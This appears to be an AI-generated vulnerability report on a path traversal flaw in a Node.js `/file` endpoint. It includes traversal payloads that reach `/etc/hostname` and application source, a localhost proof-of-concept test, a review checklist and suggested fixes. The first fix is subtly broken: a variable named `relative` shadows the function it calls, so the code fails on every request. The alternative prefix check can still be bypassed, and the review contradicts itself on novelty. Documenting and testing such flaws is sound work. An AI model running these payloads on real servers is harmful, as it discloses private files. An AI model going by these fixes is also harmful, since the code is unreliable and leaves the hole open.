# R001: Path traversal enabling arbitrary file read via `/file` endpoint

**Date**: 2026-09-22
**Severity**: High
**Impact**: Information disclosure
**Subsystem**: web-page
**Final review by**: claude-haiku-4-5, default

## Summary

The `/file` HTTP endpoint is vulnerable to path traversal via an unvalidated `name` query parameter. The application uses `path.join(publicDir, name)` to construct file paths without validating that the result remains within the intended `public/` directory. This allows attackers to read arbitrary files readable by the Node.js process, including source code, configuration, and system files.

## Root Cause

The `sendFile()` function (line 27-36 in `index.js`) calls `readFile(join(publicDir, name))` where `name` is extracted directly from the HTTP query parameter without any validation. While `path.join()` normalizes path components, it does not prevent directory traversal—when `name` contains `../` or `../../../../` sequences, the normalized result can reference files outside the `public/` directory.

The critical gap is the absence of a post-join boundary check to verify that the resolved path stays within `publicDir`.

## Reproduction

An attacker can construct HTTP requests with path traversal payloads:

- `GET /file?name=../secret.txt` — reads files in the parent directory
- `GET /file?name=../../../../etc/hostname` — reads system files
- `GET /file?name=../index.js` — reads the application source code

All requests return HTTP 200 with the file contents when the target file is readable by the Node process.

## Affected Code

- `index.js:parseRequest:12` — extracts `name` from query parameter without validation
- `index.js:sendFile:29` — calls `readFile(join(publicDir, name))` without post-join boundary validation
- `index.js:requestListener:41` — routes `/file` requests to `sendFile()`

## PoC

**Target test file**: Create at `test/path-traversal.test.js` (or append to existing test suite)

**Test name**: `test_path_traversal_arbitrary_file_read`

**Test language**: JavaScript (Node.js)

**How to run**: Start the server on a test port, create a file outside `public/`, make an HTTP request with a path traversal payload, and verify the response status and body.

### Test Body

```javascript
import { test } from "node:test";
import { strict as assert } from "node:assert";
import { spawn } from "node:child_process";
import { request } from "node:http";
import { writeFileSync, unlinkSync, rmSync } from "node:fs";
import { join } from "node:path";

test("path traversal via name parameter reads files outside public/", async () => {
  const testSecretPath = join(process.cwd(), "test-secret.txt");
  const testSecretContent = "SENSITIVE_DATA_OUTSIDE_PUBLIC_DIR";
  
  // Create test file outside public/
  writeFileSync(testSecretPath, testSecretContent);

  const server = spawn("node", ["index.js"], {
    env: { ...process.env, PORT: "3125" },
    cwd: process.cwd(),
    stdio: "ignore",
  });

  await new Promise(resolve => setTimeout(resolve, 500));

  try {
    // Test 1: Read file outside public/ via path traversal
    const result1 = await new Promise((resolve, reject) => {
      const req = request(
        "http://localhost:3125/file?name=../test-secret.txt",
        { method: "GET" },
        (res) => {
          let body = "";
          res.on("data", chunk => body += chunk);
          res.on("end", () => resolve({ statusCode: res.statusCode, body }));
        }
      );
      req.on("error", reject);
      req.end();
    });

    assert.equal(result1.statusCode, 200, "Expected HTTP 200 for path traversal");
    assert.equal(result1.body, testSecretContent, "Expected secret file contents in response");

    // Test 2: Read system file via path traversal
    const result2 = await new Promise((resolve, reject) => {
      const req = request(
        "http://localhost:3125/file?name=../../../../etc/hostname",
        { method: "GET" },
        (res) => {
          let body = "";
          res.on("data", chunk => body += chunk);
          res.on("end", () => resolve({ statusCode: res.statusCode, body }));
        }
      );
      req.on("error", reject);
      req.end();
    });

    assert.equal(result2.statusCode, 200, "Expected HTTP 200 for system file access");
    assert(result2.body.length > 0, "Expected non-empty response for system file");
  } finally {
    server.kill();
    unlinkSync(testSecretPath);
  }
});
```

## Expected vs Actual Behavior

- **Expected**: Requests to `/file` should only serve files from the `public/` directory. A request like `/file?name=../secret.txt` should either reject the path or return a 404.
- **Actual**: Path traversal payloads are normalized by `path.join()` and passed directly to `readFile()`, allowing access to arbitrary files outside `public/`. Requests return HTTP 200 with file contents.

## Adversarial Review

1. **Exercises claimed bug**: YES — The test directly demonstrates path traversal by using `../` sequences to escape the `public/` directory and retrieve files outside it.
2. **Realistic preconditions**: YES — Any HTTP client can supply the `name` query parameter. No special setup or privileged access required.
3. **Bug vs by-design**: BUG — The application is clearly intended to serve only files from `public/`, as evidenced by the `publicDir` variable and the `/file` route's purpose.
4. **Final severity**: High — Arbitrary file read vulnerability affecting unauthenticated users with information disclosure impact.
5. **In scope**: YES — The `/file` endpoint is part of the intended public API surface.
6. **Test correctness**: CORRECT — The test properly creates preconditions, makes HTTP requests, and verifies HTTP status and response body match the vulnerability claim.
7. **Alternative explanations**: NONE — The behavior is unambiguously due to the missing path validation.
8. **Novelty**: NOVEL — This is a standard path traversal vulnerability demonstrating a fundamental security issue in the codebase.

## Suggested Fix

Add a post-join boundary check using `path.relative()` to ensure the resolved path does not escape the `public/` directory:

```javascript
async function sendFile(response, name) {
  try {
    const filePath = join(publicDir, name);
    const relative = relative(publicDir, filePath);
    
    // Reject if the relative path starts with '..' (escapes publicDir)
    if (relative.startsWith("..") || relative.startsWith("/")) {
      sendGreeting(response, "Not found\n");
      return;
    }
    
    const body = await readFile(filePath);
    response.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
    response.end(body);
  } catch {
    sendGreeting(response, "Not found\n");
  }
}
```

Alternatively, use `path.resolve()` with a comparison:

```javascript
const resolvedPath = resolve(filePath);
if (!resolvedPath.startsWith(publicDir)) {
  sendGreeting(response, "Not found\n");
  return;
}
```
